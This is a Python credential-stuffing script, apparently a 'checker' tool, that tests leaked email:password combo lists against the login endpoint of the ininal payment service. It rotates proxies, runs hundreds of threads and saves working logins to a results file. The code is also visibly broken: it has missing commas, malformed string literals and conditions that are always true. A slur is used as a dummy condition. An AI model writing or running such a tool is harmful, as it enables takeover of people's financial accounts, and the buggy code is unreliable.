import requests
import random
import threading
import os
import time
import sys
import json

from re import search
from time import gmtime, strftime
time1 = strftime("%Y-%m-%d-%H-%M-%S", gmtime())



global emails
global passwords
emails = []
passwords = []
combolist = []
proxylist=[]
error=0
bad=0
good=0
cpm=0
cpm1=0
checked=0
banned=0
premium=0
free=0
num=0
clear = lambda: os.system('cls')
os.system("title ininal Checker By LilToba")
open("proxies.txt", "a")
open("combos.txt", "a")

if not os.path.exists(f"results/ininal/{time1}/"):
    os.makedirs(f"results/ininal/{time1}/")
mesaje = ["yeah nobody else does it better", "i had to type it: IM SHY", "tedo da pedo", "Wrixty the 60", "legend was here", "0x72 gonna crack this tool"]
logo = """
               -=====-                         -=====-
                _..._                           _..._
              .~     `~.                     .~`     ~.
      ,_     /          }                   {          \     _,
     ,_\'--, \   _.'`~~/                     \~~`'._   / ,--'/_,
      \'--,_`{_,}    -(                       )-    {,_}`_,--'/
       '.`-.`\;--,___.'_       liltoba       _'.___,--;/`.-`.'
         '._`/    |_ _{@}                   {@}_ _|    \`_.'
            /     ` |-';/           _       \;'-| `     \
           /   \    /  |       _   {@}_      |  \    /   \
          /     '--;_       _ {@}  _Y{@}        _;--'     \
         _\          `\    {@}\Y/_{@} Y/      /`          /_
        / |`-.___.    /    \Y/\|{@}Y/\|//     \    .___,-'| \
^^   ^^`--`------'`--`^^^^^^^^^^^^^^^^^^^^^^^^^`--`'------`--`^^^^^^^  """


def load_accounts():
    with open('combos.txt','r', encoding='utf8') as f:
        for x in f.readlines():
            emails.append(x.split(":")[0].replace('\n',''))
            passwords.append(x.split(":")[1].replace("\n",''))

with open("proxies.txt", 'r', encoding="utf-8", errors='ignore') as n:
    proxypath = n.readlines()
    for linie_proxy in proxypath:
        linie_prox = linie_proxy.split()[0]
        proxylist.append(linie_prox)
    
def ecran():
    global cpm,cpm1,error,good,bad,checked,premium,free
    cpm1=cpm
    cpm=0
    clear()
    print()
    print(logo)
    print()
    print("Coded by liltoba - " + random.choice(mesaje))
    print()
    print(f"Checked: {checked}/{len(emails)}")
    print(f"Good: {good}")
    print(f"Bad: {bad}")
    print(f"Errors: {error}")
    print(f"CPM: {cpm1*60}")


    time.sleep(1)
    threading.Thread(target=ecran, args=(),).start()


def menu():
    clear()
    print()
    print(logo)
    print()
    print("Coded by liltoba - " + random.choice(mesaje))
    print()
    print("Hello, welcome to ininalchecker..")
    print("Where do you want to go?")
    print()
    print("[1] ininal checker")
    print("[2] Credits")
    print("[3] Quit")
    alegere_menu = input("->")
    if alegere_menu == "1":
        print()
    elif alegere_menu == "2":
        clear()
        print()
        print(logo)
        print()        
        print("Owner: liltoba#6969")
        print()
        print("Author: liltoba#6969")
        print()
        input("Press ENTER to go on menu")
        menu()
    elif alegere_menu == "3":
        print("We are closing..")
        time.sleep(3)
        sys.exit()
    else:
        print("Invalid input..")
        time.sleep(2)
        menu()
def checker(email, password, proxylist):
    global error, good, bad, cpm, checked, banned, premium, free
    try:
        with requests.Session() as sess:
            proxyz = random.choice(proxylist)
            proxies = {'https': f'https://{proxyz}', 'http': f'http://{proxyz}'}
            sess.proxies= proxies
            url = "https://onis.ininal.com/login" 
            content = f"loginRequest.email={email}&loginRequest.password={password}" 

            headers = {
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36 Edg/83.0.478.58",
                "Pragma": "no-cache",
                "Accept": "application/json, text/javascript, */*; q=0.01" 
                "Host": "onis.ininal.com"
                "Origin": "https://onis.ininal.com"
                "Referer": "https://onis.ininal.com/login"
                "Sec-Fetch-Dest": "empty"
                "Sec-Fetch-Mode": "cors"
                "Sec-Fetch-Site": "same-origin"
                "X-Requested-With": "XMLHttpRequest"
            }
            r = sess.post(url, data=content, headers=headers)
            if "success" or "{"<a href="/hesap/cikis"><i class="fa fa-sign-out"></i> ÇIKIŞ YAP <i class="caret-right"></i></a>}" in r.text:
                good+=1
                cpm+=1
                checked+=1
                open(f"results/ininal/{time1}/good.txt", "a").write(f"{email}:{password}\n")
            elif "Kullanıcı Adınız yada Şifreniz hatalı." or "{"error":"Internal server error ,please try again later"}" in r.text:
                bad+=1
                cpm+=1
                checked+=1
                open(f"results/ininal/{time1}/bad.txt", "a").write(f"{email}:{password}\n")
    except Exception as err:
        error+=1
        pass

load_accounts()
menu()

if "nibba" == "nibba":
    ecran()
    num = 0
    while 1:
        if threading.active_count() < 400:
            if len(emails) > num:
                threading.Thread(target=checker, args=(emails[num],passwords[num], proxylist,)).start()
                num += 1
